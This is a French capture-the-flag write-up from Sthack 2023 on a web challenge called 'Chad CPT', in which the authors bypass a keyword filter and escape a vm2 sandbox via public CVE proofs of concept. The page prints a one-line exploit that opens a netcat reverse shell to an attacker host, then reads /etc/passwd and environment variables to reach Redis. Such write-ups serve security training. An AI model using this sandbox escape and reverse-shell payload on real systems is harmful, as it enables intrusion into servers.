<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chad CPT</title>
<link rel="stylesheet" href="/assets/css/styles.css">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">

    <link rel="stylesheet" type="text/css" href="/assets/css/monokai.css">
  </head>
  <body data-bs-theme="dark">
    <header class="d-flex py-3 mb-4 border-bottom" style="align-items: center; justify-content: space-around;">
    <a href="/" class="d-flex align-items-center text-dark text-decoration-none">
      <span class="fs-4"><span class="logo1">Hack</span><span class="logo2">vens</span></span>
    </a>
    <button id="btnSwitch" class="">üí°/üåô</button>
    <script defer="defer">
      document.getElementById('btnSwitch').addEventListener('click',()=>{
      if (document.body.getAttribute('data-bs-theme') == 'dark') {
          document.body.setAttribute('data-bs-theme','light')
          document.documentElement.style.setProperty("--logo-color1", "#161616")
      }
      else {
          document.body.setAttribute('data-bs-theme','dark')
          document.documentElement.style.setProperty("--logo-color1", "#fff")

      }
      })
    </script>
  </header>
    <div class="container">
     <div class="post">
    <div class="post__back">
    	<a href="/">&lt;-- home</a>
    </div>
    <div class="post__title">
    	<h1>Sthack 2023 / Chad CPT</h1>
	<i>May 12, 2023</i>
    </div>
    <div class="post__meta">
    	<p></p>
    </div>
    <div class="post__content"?>
        <h1 id="chad-cpt">Chad CPT</h1>
<h2 id="introduction">Introduction</h2>

<p>Pour cette √©dition de la Sthack 2023, nous avons eu le droit √† une tr√®s grande vari√©t√© de challenge. Nous vous proposons ici une r√©solution de l‚Äô√©preuve <code class="language-plaintext highlighter-rouge">ChadCPT</code>, un challenge de type web avec une ‚ÄúIA‚Äù un peu trop permissive.
Voici l‚Äô√©nonc√© :</p>

<blockquote>
  <p>Do you know Chad CPT ?
The new SCAM ‚ÄúAI‚Äù which can only solve simple math (like 1+1), this ‚ÄúAI‚Äù is pretty stoned and does not seem to handle failure‚Ä¶
Retrieve the value of the flag located in the database.</p>
</blockquote>

<p><img src="/assets/img/sthack2023/chad-cpt/interface.png" alt="interface" class="img-responsive smallpict" /></p>

<p>L‚Äôapplication ChadCPT consiste en un formulaire √† une seule entr√©e, ayant pour objectif de r√©pondre √† des op√©rations arithm√©tiques de type <code class="language-plaintext highlighter-rouge">2+2</code>, <code class="language-plaintext highlighter-rouge">3*3</code>, ‚Ä¶</p>

<p><img src="/assets/img/sthack2023/chad-cpt/3+3.png" alt="3+3" class="img-responsive smallpict" /></p>

<h2 id="recherche-de-bug">Recherche de bug</h2>

<p>Nous cherchons dans un premier temps √† r√©aliser un bug sur l‚Äôapplication dans le but d‚Äôobserver des situations potentiellement non pr√©vues. Parmi les bugs classiques pouvant intervenir lors d‚Äôop√©rations arithm√©tiques, nous retrouvons la fameuse division par z√©ro.</p>

<p>En effectuant une division par z√©ro telle que <code class="language-plaintext highlighter-rouge">3/0</code>, l‚Äôapplication nous retourne une erreur <code class="language-plaintext highlighter-rouge">Infinity</code>.</p>

<p><img src="/assets/img/sthack2023/chad-cpt/30.png" alt="30" class="img-responsive smallpict" /></p>

<p>Cette erreur non trait√©e est typique d‚Äôun programme JavaScript :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/infinity.png" alt="Infinity" class="img-responsive smallpict" /></p>

<p>L√† o√π une application python (par exemple) aurait retourn√© une erreur de type <code class="language-plaintext highlighter-rouge">ZeroDivisonError</code> :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/python.png" alt="python" /></p>

<p>Du JavaScript c√¥t√© serveur, nous partons donc dans l‚Äôhypoth√®se d‚Äôune application d√©velopp√©e avec NodeJS.
Le programme √©tant r√©ceptif aux bool√©ens (<code class="language-plaintext highlighter-rouge">true</code> et <code class="language-plaintext highlighter-rouge">false</code>), nous tentons ensuite de voir si celle-ci peut accepter les √©quations sous forme de conditions JavaScript. Effectivement <code class="language-plaintext highlighter-rouge">1==1</code> nous r√©pond <code class="language-plaintext highlighter-rouge">true</code>, quand <code class="language-plaintext highlighter-rouge">1==2</code> r√©sulte en l‚Äôabsence de r√©ponse (synonyme ici de <code class="language-plaintext highlighter-rouge">false</code>).</p>

<p><img src="/assets/img/sthack2023/chad-cpt/1==1.png" alt="1==1" class="img-responsive smallpict" /></p>

<p><img src="/assets/img/sthack2023/chad-cpt/1==2.png" alt="1==2" class="img-responsive smallpict" /></p>

<p>Nous pouvons alors proposer des √©galit√©s telles que <code class="language-plaintext highlighter-rouge">"test".length==4</code> afin de valider la pr√©sence d‚Äôun moteur JavaScript c√¥t√© serveur, et √©galement garder en t√™te la possibilit√© d‚Äôutiliser des √©galit√©s pour une potentielle exploitation √† l‚Äôaveugle.</p>

<p><img src="/assets/img/sthack2023/chad-cpt/length==4.png" alt="length==4" class="img-responsive smallpict" /></p>

<p>Apr√®s avoir confirm√© la pr√©sence de NodeJS, nous pouvons alors tenter d‚Äôex√©cuter les fonctions clefs du langage pouvant permettre d‚Äô√©lever nos privil√®ges. La fonction <code class="language-plaintext highlighter-rouge">eval(&lt;instruction&gt;)</code> fonctionne et parait alors id√©ale pour tenter d‚Äôex√©cuter du code JavaScript sans √™tre g√™n√© par l‚Äôinterpr√©teur en attente d‚Äôun input incluant une op√©ration arithm√©tique.</p>

<h2 id="d√©couverte-de-lenvironnement-dex√©cution">D√©couverte de l‚Äôenvironnement d‚Äôex√©cution</h2>

<p>NodeJS est particuli√®rement riche par ses modules (natifs ou non), mais nous observons que leur import reste impossible, sans savoir si ce sont les modules qui sont introuvables ou l‚Äôinstruction <code class="language-plaintext highlighter-rouge">require</code> qui est bloqu√©e :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/fs.png" alt="fs" class="img-responsive smallpict" /></p>

<p>Nous tentons √©galement de cr√©er un processus √† part dans le but d‚Äôy injecter une commande syst√®me. Cette op√©ration est notamment possible via l‚Äôutilisation de <code class="language-plaintext highlighter-rouge">child_process</code>. Nous notons cependant que l‚Äôapplication r√©alise un contr√¥le s√©curit√© et va alors bloquer toute requ√™te contenant le mot clef <code class="language-plaintext highlighter-rouge">process</code> avant m√™me de l‚Äôinterpr√©ter.</p>

<p><img src="/assets/img/sthack2023/chad-cpt/process.png" alt="process" class="img-responsive smallpict" /></p>

<p>Pour contourner ce blocage, nous pouvons alors dynamiquement diviser et concat√©ner le mot de la mani√®re suivante : <code class="language-plaintext highlighter-rouge">"pro"+"cess"</code>.</p>

<p><img src="/assets/img/sthack2023/chad-cpt/pro+cess.png" alt="pro+cess" class="img-responsive smallpict" /></p>

<p>Le message d‚Äôerreur disparait, le contournement est alors fonctionnel.</p>

<p>Dans des situations dit de <code class="language-plaintext highlighter-rouge">jail</code>/<code class="language-plaintext highlighter-rouge">sandbox</code>, le programme fait en sorte de nous permettre d‚Äôex√©cuter les commandes natives du langage, tout en emp√™chant l‚Äôex√©cution de commandes syst√®mes sur l‚Äôh√¥te. Notre objectif est alors de gagner des informations sur cet environnement, et en trouver les failles pour en abuser.</p>

<p>Nous observons alors l‚Äôenvironnement d‚Äôex√©cutions. NodeJS √©tant un langage supportant la philosophie objet, nous tentons de lui faire afficher les propri√©t√©s de son objet courant <code class="language-plaintext highlighter-rouge">this</code> via <code class="language-plaintext highlighter-rouge">Object.getOwnPropertyNames(this)</code>.</p>

<p>Nous r√©cup√©rons alors un grand nombre de propri√©t√©s de l‚Äôobjet courant, dont une propri√©t√© <code class="language-plaintext highlighter-rouge">VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL</code>.</p>

<p>Nous nous informons alors sur <code class="language-plaintext highlighter-rouge">vm2</code> et apprenons qu‚Äôil s‚Äôagit d‚Äôune sandbox NodeJS :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/vm2.png" alt="vm2" class="img-responsive smallpict" /></p>

<p>Une premi√®re hypoth√®se est d‚Äôobserver les mauvaises configurations/utilisations/d√©ploiements qui pourraient mener √† un √©chappement de la sandbox vm2. Cette hypoth√®se a fait ≈ìuvre de tr√®s nombreux tests, sans r√©sultats.</p>

<p>Nous observons alors que deux failles ont r√©cemment (avril 2023) √©t√© publi√©es :</p>

<ul>
  <li>CVE-2023-29017</li>
  <li>CVE-2023-29199</li>
</ul>

<p>Des preuves d‚Äôexploitation sont √©galement disponibles, ce qui facilite l‚Äôexploitation :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/vm2cve.png" alt="vm2cve" class="img-responsive smallpict" /></p>

<p>https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d</p>

<p>(Le second POC s‚Äôav√©rant plus stable pour maintenir une connexion ouverte, la suite de cet article utilisera alors l‚Äôexploit ici not√© <code class="language-plaintext highlighter-rouge">vm2_3.9.14_exploit_2.js</code>).</p>

<h2 id="exploitation">Exploitation</h2>

<p>Dans ce POC, nous avons tout d‚Äôabord la mise en place d‚Äôun environnement vm2 minimal, puis l‚Äôex√©cution de l‚Äôexploit :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/exploit.png" alt="exploit" class="img-responsive smallpict" /></p>

<p>Nous r√©cup√©rons alors la partie surlign√©e ci-dessus. Les modifications √† appliquer sont les suivantes :</p>

<ul>
  <li>Remplacer <code class="language-plaintext highlighter-rouge">touch flag</code> par une commande qui nous int√©resse. Nous souhaitons obtenir un acc√®s au syst√®me, la commande NetCat <code class="language-plaintext highlighter-rouge">nc &lt;IP_serveur_attaquant&gt; &lt;port_serveur_attaquant&gt; -e /bin/sh</code> sera alors s√©lectionn√©e pour un reverse-shell.</li>
  <li>Couper les cha√Ænes contenant le mot ¬´ process ¬ª pour permettre de contourner la protection en place.</li>
  <li>Faire un oneliner JavaScript pour √©viter les probl√®mes li√©s au retour √† la ligne</li>
</ul>

<p>Voici le code d‚Äôexploitation final :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
Error.prepareStackTrace = (e, frames) =&gt; { var a="child_pro"+"cess"; var b="return pro"+"cess"; frames.constructor.constructor(b)().mainModule.require(a).execSync('nc &lt;IP_serveur_distant&gt; &lt;port_serveur_distant&gt; -e /bin/sh'); }; async function aa(){eval("1=1")} aa()

</code></pre></div></div>

<p>Nous initialisons √©galement un serveur NetCat en √©coute sur Internet via la commande <code class="language-plaintext highlighter-rouge">nc -lvp &lt;port&gt;</code>.</p>

<p>L‚Äôenvoi du payload permet alors de r√©cup√©rer un shell sur le serveur distant :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/nc.png" alt="nc" class="img-responsive smallpict" /></p>

<h2 id="phase-de-post-exploitation">Phase de post-exploitation</h2>

<p>Nous remarquons que nous sommes connect√©s sur le serveur en tant que <code class="language-plaintext highlighter-rouge">appuser</code>, apr√®s quelques recherches dans les diff√©rents dossiers, nous relisons √† t√™te repos√©e l‚Äô√©nonc√© : il faut trouver les acc√®s √† une <code class="language-plaintext highlighter-rouge">base de donn√©es</code>.</p>

<p>Nous trouvons un premier indice dans le fichier <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, un utilisateur <code class="language-plaintext highlighter-rouge">redis</code> est pr√©sent. Nous savons donc maintenant qu‚Äôune base redis est utilis√©e, l‚Äôex√©cution de la commande <code class="language-plaintext highlighter-rouge">env</code>, listant les variables d‚Äôenvironnement, nous permet de nous conforter dans cette hypoth√®se :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
appuser@202035c4bee1:/app$ env
env
REDIS_URL=redis://redis:6379/2
HOSTNAME=202035c4bee1
YARN_VERSION=1.22.19
PWD=/app
HOME=/home/appuser
LS_COLORS=
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=19.9.0
_=/usr/bin/env

</code></pre></div></div>

<p>Nous nous connectons sur le port 6379 h√©bergeant le service redis, la connexion fonctionne :</p>

<p><img src="/assets/img/sthack2023/chad-cpt/redis.png" alt="redis" class="img-responsive smallpict" /></p>

<p>Il ne nous reste plus qu‚Äô√† y retrouver le flag ‚Ä¶</p>

<p><img src="/assets/img/sthack2023/chad-cpt/flag.png" alt="flag" class="img-responsive smallpict" /></p>

<p>‚Ä¶ et valider l‚Äô√©preuve.</p>

    </div>
</div>


    </div>
  </body>
</html>
